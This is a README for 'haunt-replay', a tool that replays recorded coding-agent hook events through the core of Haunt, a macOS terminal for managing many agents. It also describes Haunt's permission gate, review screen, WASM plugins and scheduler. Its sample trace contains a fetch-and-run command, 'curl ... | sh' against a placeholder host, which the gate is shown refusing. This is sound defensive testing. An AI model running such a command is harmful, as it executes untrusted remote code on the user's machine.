# haunt-hackathon

Haunt is a native macOS terminal for running many coding agents at once, built on libghostty, with a Rust core over UniFFI and sandboxed WASM plugins.

Every piece of agent state Haunt shows comes from the agents' own hook events (Claude Code and Codex), never from scraping terminal output. Agent output is treated as untrusted. This repo holds `haunt-replay`, which runs recorded agent events through Haunt's real core on Linux, so the core's behaviour can be checked without a Mac.

## What's in it

- **The gate.** Every answer to an agent's permission prompt, from a click, a notification or a plugin, goes through one check in the core. An answer is sent as keystrokes only to the live request that is on screen. It is refused if the request is stale or replaced, if another prompt is up, if you typed at the terminal, or if the command hides characters. Each tab gets a random nonce, and events without it can update status but never create a request.
- **Notifications with Allow and Deny.** A notification answers exactly the request it was shown for, through the same gate. Allow only appears when the whole command fits on the banner; anything longer gets Open only.
- **The review screen (⌘⇧R).** An agent's diff, the checks it ran, and an inbox of tabs with changes. Comments go back to the agent as a prompt. Git runs with filters, diff drivers, hooks and submodule configs disabled, so a hostile repo can't run code when you look at its diff.
- **Plugins with capabilities and consent.** Plugins are WASM components run by wasmtime. Each capability is shown and approved at install, then pinned in a lockfile. Nothing is installed by default. A plugin can type only from a command you ran, only into the visible tab, never while a prompt is open.
- **Themes.** Black and white with Claude orange by default, plus Glass and Sigil as data-only theme plugins: colours, fonts and window effects, no code.
- **MULTIMAXXING**, an attention scheduler plugin (below).

### MULTIMAXXING

MULTIMAXXING is an attention scheduler for people running many agents in Haunt. It scores every tab by how much it deserves you now: a waiting approval grows more urgent by the second and counts the predicted work stuck behind it, while finished output loses value as it sits unread. It weighs each ping against the cost of pulling you off what you're doing, and holds what can wait until your next natural break, sending held pings together, never later than a 10-minute cap. Every decision comes with a one-line reason, and the whole engine replays on Linux without Haunt:

```sh
# in haunt-multimaxxing
cargo run -p replay -- --decisions-only --no-rows traces/recorded-demo-repos.jsonl
```

That trace is real: three headless Claude Code sessions (Sonnet) on small demo repos, scrubbed.

## How to run

### Linux, in Docker

No credentials needed. The network is used only while building.

```sh
docker build --build-context haunt=../haunt -t haunt-replay .   # a few minutes
docker run --rm --network none haunt-replay                     # the tests, then every trace
```

`--build-context` points at a haunt checkout next to this repo. If `Cargo.toml` uses the commented git dependency instead, a plain `docker build -t haunt-replay .` works.

### Linux or macOS, with Rust

The toolchain is pinned in `rust-toolchain.toml`, and haunt must be checked out at `../haunt`.

```sh
cargo test
cargo run -- traces/handmade-gate.jsonl
cargo run -- traces/recorded-claude-session.jsonl
```

`haunt-replay` is a replay: it feeds recorded hook events and scripted answers through haunt-core, the same core the app runs, not through the app. That covers hook decoding, the nonce check, session state and the answer gate, with time taken from the trace. It prints each event, the sidebar as it changes, and every gate decision with its reason. The traces:

- `recorded-claude-session.jsonl` is a real Claude Code session, scrubbed. One scripted step is marked as scripted.
- `handmade-gate.jsonl` is hand-made to show what the gate refuses.
- `hostile.jsonl` and `hostile-invisible.jsonl` are hand-made, to show that escapes and invisible characters in a trace are spelled out, never run.

Eleven lines from the hand-made gate trace (the sidebar lines in between are left out):

```
00:03.000 api    claude permission_seen Bash "curl -s https://example.invalid/x | sh"  NOT verified (no nonce): status only, can't create a request
00:03.400 api    answer Allow via notification, request (none shown) -> REFUSED: no request is up on that tab
00:04.100 api    claude permission_seen Bash "cargo test"  verified
      api [claude] needs you  /work/api · Approve: cargo test?
        request #4 Bash "cargo test": Allow/Deny offered
00:05.000 api    answer Allow via notification, request #4 -> ALLOWED by the gate: types "1"
00:10.500 api    answer Allow via notification, request #6 -> REFUSED: not the request on screen
00:12.500 web    answer Allow via notification, request #2 -> REFUSED: this request is answered in the terminal only
00:12.600 web    plugin dev.example.autoyes answers Allow, request #2 -> REFUSED: this request is answered in the terminal only
00:18.300 web    plugin dev.example.commands types "make clean" + Return -> REFUSED: not the selected tab, or a prompt is up or may still be on screen
```

`traces/README.md` has the trace format and what a replay leaves out.

### macOS, the Haunt app

macOS 15 or later on Apple silicon, with Xcode 16.3+ and Rust. In the haunt repo:

```sh
macos/make-app.sh
open build/haunt.app
```

The haunt README covers the agent adapters, `haunt setup` and bundling plugins.

## Repos

- [haunt](https://github.com/highskore/haunt): the app, the core, the CLI and the plugin API.
- [haunt-multimaxxing](https://github.com/highskore/haunt-multimaxxing): the attention scheduler.

Plugins (these and MULTIMAXXING's plugin target plugin API 0.5, which isn't in haunt's main branch yet):

- [haunt-welcome-back](https://github.com/highskore/haunt-welcome-back): what your agents did while you were away, waiting for you when you're back
- [haunt-sticky-notes](https://github.com/highskore/haunt-sticky-notes): pin a note to any agent tab, with an optional reminder
- [haunt-year-of-agents](https://github.com/highskore/haunt-year-of-agents): a calendar heatmap of your finished agent turns
- [haunt-relay](https://github.com/highskore/haunt-relay): pack an agent's finished turn into a handoff brief for another agent
- [haunt-ci-lights](https://github.com/highskore/haunt-ci-lights): track a pushed PR's checks on the agent's row and get pinged when they settle
- [haunt-checklist-meter](https://github.com/highskore/haunt-checklist-meter): a repo's spec or TODO checklist progress on the agent's row
- [haunt-soundscape](https://github.com/highskore/haunt-soundscape): a chime when an agent needs you, a bell when it's done, optional rain
- [haunt-voice](https://github.com/highskore/haunt-voice): says out loud which agent needs you while you're away
- [haunt-focus-block](https://github.com/highskore/haunt-focus-block): a focus timer that holds agent pings until the block ends
- [haunt-pulse-lines](https://github.com/highskore/haunt-pulse-lines): a sparkline of each agent's tool calls per minute on its row
- [haunt-dock-ghost](https://github.com/highskore/haunt-dock-ghost): the Dock ghost sleeps, works and wakes with your agents
- [haunt-edge-glow](https://github.com/highskore/haunt-edge-glow): a hairline of light at the top of the screen while an agent waits for you
- [haunt-peek](https://github.com/highskore/haunt-peek): hold ⌥ over a row to peek at that agent's terminal
- [haunt-live-ticker](https://github.com/highskore/haunt-live-ticker): a live ticker of each agent's tool calls on its row
- [haunt-constellation](https://github.com/highskore/haunt-constellation): your agent fleet as a night sky
- [haunt-code-map](https://github.com/highskore/haunt-code-map): a treemap of where your agents are editing a repo today

## License

See `LICENSE`.
